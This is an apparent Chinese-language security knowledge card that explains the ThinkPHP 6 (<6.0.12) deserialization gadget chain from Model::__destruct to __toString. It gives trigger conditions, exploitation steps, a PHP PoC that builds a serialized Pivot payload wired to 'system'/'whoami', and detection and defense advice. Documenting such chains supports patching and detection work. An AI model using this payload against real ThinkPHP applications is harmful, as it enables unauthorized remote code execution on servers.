---
id: web-php-deserialization-thinkphp6-model-destruct-tostring-chain
title: ThinkPHP 6 (<6.0.12) Model 链：__destruct lazySave→save→updateData→checkAllowFields→db 拼接触发 __toString
type: scenario
domain: web
path: web/php/deserialization
technique: thinkphp6-model-destruct-to-tostring-prefix-chain
aliases:
- ThinkPHP6 POP 链
- TP6 toString 前半链
- Model __destruct lazySave
- checkAllowFields 字符串拼接
- Pivot 子类实例化
tags:
- php
- thinkphp
- deserialization
- pop-chain
- magic-method
- destruct
- tostring
- gadget
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: ThinkPHP < 6.0.12
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T12:42:31+08:00'
  notes: 已对照原文核对；__destruct(lazySave)->save(isEmpty/trigger BeforeWrite, exists)->updateData(force=getChangedData, checkAllowFields)->db 拼接 name/table . suffix 触发 __toString，条件与原文一致；影响范围按原文标注 thinkphp<6.0.12；未执行 PHP payload
---

## 一句话结论

ThinkPHP 6.0.12 之前，`think\Model` 的 `__destruct()` 在 `$this->lazySave` 为真时会调用 `save()`；`save()` 在 `$this->exists = true` 时走 `updateData()`，后者在 `$this->withEvent = false`、`$this->force = true`、`$this->data` 非空时继续执行 `checkAllowFields()`，而 `checkAllowFields()` 在 `field` 与 `schema` 为空时调 `db()`，`db()` 里的 `$this->name . $this->suffix` / `$this->table . $this->suffix` 是**字符串拼接**——只要把 `$this->table` 或 `$this->name` 设成任意对象（如 `new think\model\Pivot()`），就会触发该对象的 `__toString()`，从而把反序列化入口接进任意 `__toString` gadget。`Model` 是抽象类不能直接实例化，实际 payload 用其子类 `Pivot`。

## 原理

- **起点是析构**：`unserialize` 结束、对象被销毁时自动调 `__destruct()`；`Model::__destruct()` 里只有一句 `if ($this->lazySave) { $this->save(); }`。`$this->lazySave` 是私有/protected 属性，反序列化可任意赋值，因此这一步相当于"可无条件调用的入口"，只取决于属性值。
- **save() 的三个关门条件**：
  - `$this->setAttrs($data)` 先执行（参数默认为空数组，不覆盖已有 `data`）；
  - `if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) return false;` → 要求 `data` 非空（`isEmpty()` 是 `empty($this->data)`）且 `trigger()` 不被事件拦截；
  - `trigger()` 判断 `if (!$this->withEvent) return true;`，所以 `$this->withEvent = false` 即可放行；否则会走 `onXxx`/事件类分支，容易被 `false === $result` 拦死。
- **exists 决定分支**：`$result = $this->exists ? $this->updateData() : $this->insertData($sequence);` 只有 `exists = true` 才走 `updateData()`（insert 分支需要数据库表且会真的插入，不适合作为链的一环）。
- **updateData() 的两个前置**：`trigger('BeforeUpdate')`（同样靠 `withEvent = false` 放行）与 `$data = $this->getChangedData()`；`getChangedData()` 里 `$data = $this->force ? $this->data : array_udiff_assoc(...)`，因此把 `$this->force = true` 就能直接拿到 `data`，非空即通过 `if (empty($data))` 的判断。
- **checkAllowFields() 的分叉**：`if (empty($this->field)) { if (!empty($this->schema)) {...} else { $query = $this->db(); $table = $this->table ? $this->table . $this->suffix : $query->getTable(); ... } }`。只有当 `field` 与 `schema` 都为空时才走 `else` 进入 `db()`；这一步正是把控制流送进 sink 的关键（`field`/`schema` 默认空，不需要特意设置）。
- **db() 里的字符串拼接**：`db()` 中 `->name($this->name . $this->suffix)` 与 `if (!empty($this->table)) { $query->table($this->table . $this->suffix); }` 都是把属性与 `suffix` 拼接；PHP 在把一个对象参与字符串拼接时会调用它的 `__toString()`。因此把 `$this->table`（或 `name`）设为任意对象即可触发其 `__toString`，`suffix` 作为附加字符串。
- **为什么必须用 Pivot**：`Model` 声明为 `abstract class`，`unserialize` 需要具体类；`think\model\Pivot` 继承 `Model` 并在框架里真实存在，反序列化它即可带上 Model 的 trait 属性（`Attribute`/`Conversion`/`ModelEvent` 等），所以 payload 用 `new Pivot(...)`。
- **这条链的能力边界**：它只完成"到 `__toString` 为止"的前半段——本身不执行命令，价值是把 ThinkPHP 6 的反序列化入口接到**任意 `__toString` 后链**（如后链卡的 toArray→getAttr→withAttr 回调）。原文的定位就是"TP5 的 Windows/Pipes 入口在 TP6 被移除，但 `__toString` 之后 gadget 仍在，需要重新找回触发点"。

## 触发条件

- 目标为 ThinkPHP 6.x，且版本低于 6.0.12（原文影响范围 `thinkphp<6.0.12`）；
- 存在可控的 `unserialize` 入口（控制器/Session/缓存/队列等；原文用一个 `unserialize($input)` 的演示控制器）；
- `think\model\Pivot` 与 `think\Model` 的 trait/属性结构未被裁剪，`table`/`name`/`suffix`/`data`/`exists`/`force`/`lazySave`/`withEvent` 等属性名与版本一致；
- 存在可用的 `__toString` 后链（否则只能触发到字符串转换，无法进一步利用）；
- 无 `unserialize` 白名单/签名保护（如 `allowed_classes` 限制）。

## 利用步骤

1. 确认版本：读取 `composer.lock`/`vendor/topthink/framework/` 版本，或触发错误页版本号；目标需 < 6.0.12。
2. 按源码确认属性名与访问级别（私有属性在序列化串里要写成 `\0类名\0属性名`，或干脆用同类子类 `Pivot` 实例来包裹，让 PHP 反序列化按类作用域写回）。
3. 构造 `think\model\Pivot` 实例，设置：
   - `data = ['任意键' => '任意值']`（非空即可，实际值给后链用）；
   - `exists = true`、`force = true`、`lazySave = true`、`withEvent = false`；
   - `suffix = ''`（或任意字符串）；
   - `table` = 一个会触发 `__toString` 的对象（后链 gadget）；
   - `field`、`schema` 保持为空。
4. `serialize` 后 urlencode，提交到 `unserialize` 入口；或直接用 `ReflectionClass` 改写私有属性生成 payload。
5. 观察是否进入后链（如后链的 `toArray→getAttr` 被调用、`db()` 处断点命中、或最终命令执行回显）。

## PoC

```php
<?php
namespace think\model\concern;

trait Attribute {
    private $data = ['cyz' => 'whoami'];
    private $withAttr = ['cyz' => 'system'];
}

trait ModelEvent {
    protected $withEvent = true;
}

namespace think;

abstract class Model {
    use model\concern\Attribute;
    use model\concern\ModelEvent;

    private $exists;
    private $force;
    private $lazySave;
    protected $suffix;

    function __construct($a = '') {
        $this->exists = true;
        $this->force = true;
        $this->lazySave = true;
        $this->withEvent = false;
        $this->suffix = $a;
    }
}

namespace think\model;

use think\Model;

class Pivot extends Model {}

echo urlencode(serialize(new Pivot(new Pivot())));
```

调用链（前半段）：

```text
__destruct()  // lazySave=true
 └─ save()  // data 非空、withEvent=false 使 trigger 返回 true
     └─ updateData()  // exists=true；force=true 使 getChangedData 直接返回 data
         └─ checkAllowFields()  // field/schema 空 → else
             └─ db()
                 └─ $this->table . $this->suffix   // 对象参与拼接 → __toString()
                     └─ 【后链：__toString gadget】
```

## 变体与关联

- 变体：不设 `table` 而设 `name`，利用 `->name($this->name . $this->suffix)` 的拼接同样触发 `__toString`。
- 变体：把 `$this->table` 设为 `new self(...)`（Pivot 自身），用 `Model::__toString()`（`Conversion` trait 的 `toJson`）进后链，即原文 payload 里的 `new Pivot(new Pivot())`。
- 变体：`withEvent = true` 时走 `onBeforeWrite`/事件类分支，可换用事件对象控制返回值，但风险大（`false === $result` 会中断链）。
- 关联：[[web-php-deserialization-thinkphp6-conversion-toarray-withattr-callback-rce]]（本卡的后链：`__toString → toJson → toArray → getAttr → getValue → withAttr` 回调执行命令，两卡拼接成完整 RCE）。
- 关联：[[web-php-framework-thinkphp-invokefunction-file-put-contents-webshell]]、[[web-php-framework-thinkphp-5x-invokefunction-captcha-rce]]（同为 ThinkPHP 生态的 RCE，但入口是模板/方法调用而非反序列化）。
- 边界：6.0.12 起该链被修（`lazySave`/`checkAllowFields` 等调用路径受限），需按版本核对；`Model` 抽象类不能直接实例化，必须用 `Pivot` 等具体子类；`db()` 在真实环境可能先尝试连接数据库而抛异常，需保证 `table` 对象在拼接之前不被更早的失败路径打断。

## 检测与防御

- 检测：`unserialize` 入参出现 `think\model\Pivot`/`think\Model` 类名；序列化串中出现 `lazySave`/`withEvent`/`force`/`exists` 组合；运行时监控 `__destruct` 后进入 `save`/`db` 的调用栈。
- 防御：升级到 6.0.12+；对 `unserialize` 使用 `allowed_classes` 白名单（禁止 `think\*` 模型类）；避免把用户输入直接 `unserialize`；启用 WAF 对 `O:` 序列化对象的类名检测。
